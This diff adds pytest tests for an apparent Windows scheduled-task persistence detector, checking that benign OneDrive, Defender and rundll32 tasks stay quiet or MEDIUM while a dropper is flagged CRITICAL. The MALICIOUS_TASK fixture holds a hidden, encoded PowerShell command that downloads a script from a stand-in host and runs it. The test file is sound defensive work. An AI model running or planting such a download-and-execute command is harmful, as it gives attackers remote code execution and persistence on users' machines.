@@ -194,3 +194,120 @@ def test_main_returns_finding_count(monkeypatch):
     ):
         monkeypatch.setattr(bot, fn, lambda: None)
     assert bot.main() == 0
+
+
+# --- scheduled-task persistence check -------------------------------------
+#
+# The original implementation substring-matched "helper"/"sync"/"updater" across
+# the whole CSV row and reported 37 healthy vendor tasks; a naive LOLBin rule
+# then reported ~20 of Windows' own rundll32 maintenance tasks and labelled
+# Defender's platform binaries CRITICAL.  These tests pin the shape that must
+# stay silent and the shape that must not.
+
+SCHTASKS_SAMPLE = (
+    '"PC","\\OneDrive Reporting Task","N/A","Ready","Interactive only",'
+    '"26-10-2026 14:06:16","0","Microsoft Corporation",'
+    '"%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe /reporting",'
+    '"N/A","N/A","Enabled","Disabled","Stop On Battery Mode","Holger","Disabled",'
+    '"02:00:00","N/A","One Time Only","14:06:15","23-10-2026","N/A","N/A","N/A",'
+    '"24 Hour(s)","None","Disabled","Disabled"\n'
+    '"PC","\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup",'
+    '"N/A","Ready","Interactive only","26-10-2026 09:39:24","0",'
+    '"Microsoft Corporation",'
+    '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26090.9-0\\'
+    'MpCmdRun.exe -IdleTask -TaskName WdCleanup","N/A","N/A","Enabled","Disabled",'
+    '"","Holger","Disabled","Disabled","N/A","On demand only","N/A","N/A","N/A",'
+    '"N/A","N/A","N/A","N/A","N/A","N/A","N/A"\n'
+    '"PC","\\Microsoft\\Windows\\Application Experience\\PcaPatchDbTask","N/A",'
+    '"Ready","Interactive only","26-10-2026 09:39:24","0","Microsoft Corporation",'
+    '"%windir%\\system32\\rundll32.exe %windir%\\system32\\PcaSvc.dll,'
+    'PcaPatchSdbTask","N/A","N/A","Enabled","Disabled","","Holger","Disabled",'
+    '"Disabled","N/A","On demand only","N/A","N/A","N/A","N/A","N/A","N/A","N/A",'
+    '"N/A","N/A","N/A"\n'
+)
+
+MALICIOUS_TASK = (
+    '"PC","\\SystemUpdate","N/A","Ready","Interactive only",'
+    '"26-10-2026 09:39:24","0","DESKTOP\\Holger",'
+    '"C:\\Users\\Holger\\AppData\\Roaming\\svc\\update.ps1" powershell -w hidden '
+    '-enc SQBFAFgA -Command "iwr http://198.51.100.7/a.ps1|iex",'
+    '"N/A","N/A","Enabled","Disabled","","Holger","Disabled","Disabled","N/A",'
+    '"On demand only","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A"\n'
+)
+
+
+def test_parse_schtasks_verbose_maps_name_author_and_action():
+    tasks = bot._parse_schtasks_verbose(SCHTASKS_SAMPLE)
+    assert len(tasks) == 3
+    assert tasks[0]["name"] == "\\OneDrive Reporting Task"
+    assert tasks[0]["author"] == "Microsoft Corporation"
+    assert "OneDriveStandaloneUpdater.exe" in tasks[0]["action"]
+    assert tasks[2]["action"].startswith("%windir%\\system32\\rundll32.exe")
+
+
+def test_parse_schtasks_verbose_skips_junk_and_short_rows():
+    assert bot._parse_schtasks_verbose('INFO: There are no tasks.\n"a","b"\n') == []
+
+
+def test_task_risk_silent_for_defender_programdata_task():
+    """Defender lives in ProgramData\\Microsoft - not a dropper directory."""
+    task = bot._parse_schtasks_verbose(SCHTASKS_SAMPLE)[1]
+    assert bot._task_risk(task) is None
+
+
+def test_task_risk_silent_for_os_rundll32_maintenance_task():
+    """rundll32 from %windir% is how Windows schedules its own maintenance."""
+    task = bot._parse_schtasks_verbose(SCHTASKS_SAMPLE)[2]
+    assert bot._task_risk(task) is None
+
+
+def test_task_risk_downgrades_vendor_appdata_only_task_to_medium():
+    task = bot._parse_schtasks_verbose(SCHTASKS_SAMPLE)[0]
+    verdict = bot._task_risk(task)
+    assert verdict is not None
+    assert verdict[0] == "MEDIUM"
+
+
+def test_task_risk_flags_dropper_with_encoded_powershell_as_critical():
+    task = bot._parse_schtasks_verbose(MALICIOUS_TASK)[0]
+    verdict = bot._task_risk(task)
+    assert verdict is not None
+    severity, reason = verdict
+    assert severity == "CRITICAL"
+    assert "user-writable" in reason
+    assert "powershell" in reason
+    assert "http://" in reason
+
+
+def test_check_scheduled_tasks_reports_only_the_dropper_as_critical(monkeypatch):
+    """Vendor task in %localappdata% stays MEDIUM; only the dropper is CRITICAL.
+
+    The OneDrive task is a real (if benign) signal - a known vendor launching
+    from a user-writable dir - so suppressing it entirely would hide the exact
+    directory a dropper uses.  It must not, however, be ranked with the dropper.
+    """
+    monkeypatch.setattr(bot, "sh", lambda _cmd: SCHTASKS_SAMPLE + MALICIOUS_TASK)
+    monkeypatch.setattr(bot, "FINDINGS", [])
+    bot.check_scheduled_tasks()
+    critical = [detail for sev, _name, detail in bot.FINDINGS if sev == "CRITICAL"]
+    medium = [detail for sev, _name, detail in bot.FINDINGS if sev == "MEDIUM"]
+    assert len(critical) == 1
+    assert "\\SystemUpdate" in critical[0]
+    assert all("\\SystemUpdate" not in detail for detail in medium)
+
+
+def test_check_scheduled_tasks_is_quiet_on_vendor_only_host(monkeypatch):
+    """Regression: the 37-vendor-task false-positive flood."""
+    rows = "".join(
+        f'"PC","\\\\{vendor} Helper Update Task","N/A","Ready","Interactive only",'
+        f'"26-10-2026 09:39:24","0","{vendor}",'
+        f'"C:\\\\Program Files\\\\{vendor}\\\\helper.exe /sync",'
+        '"N/A","N/A","Enabled","Disabled","","Holger","Disabled","Disabled","N/A",'
+        '"On demand only","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A",'
+        '"N/A","N/A"\n'
+        for vendor in ("Google", "Adobe", "Mozilla", "NVIDIA", "Intel", "AMD")
+    )
+    monkeypatch.setattr(bot, "sh", lambda _cmd: rows)
+    monkeypatch.setattr(bot, "FINDINGS", [])
+    bot.check_scheduled_tasks()
+    assert bot.FINDINGS == []
